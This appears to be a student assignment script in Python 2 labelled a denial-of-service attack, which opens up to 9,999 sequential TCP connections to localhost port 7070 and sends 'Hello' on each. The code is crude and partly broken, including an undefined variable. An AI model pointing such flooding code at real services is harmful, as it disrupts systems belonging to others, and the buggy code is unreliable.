import os
import sys
import time
import socket
import random

os.system("clear")
print("Assignment II DOS Attack")

MSG = 'Hello'
IP_ADD = '127.0.0.1'
client_connection = 10000
PORT = 7070

print(ip)
print("Attacking Is Start On %s" % IP_ADD)


def DOS(i):

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((IP_ADD, PORT))
        sock.send(MSG)
        sock.sendto(MSG, (IP_ADD, PORT))
        sock.send(MSG)
    except socket.error, e:
        print("Failed: %s" % e)
    print("connect %s times to %s through port %s" % (i, IP_ADD, PORT))
    sock.close()


for i in range(1, client_connection):
    DOS(i)

print("The Connection is finished")
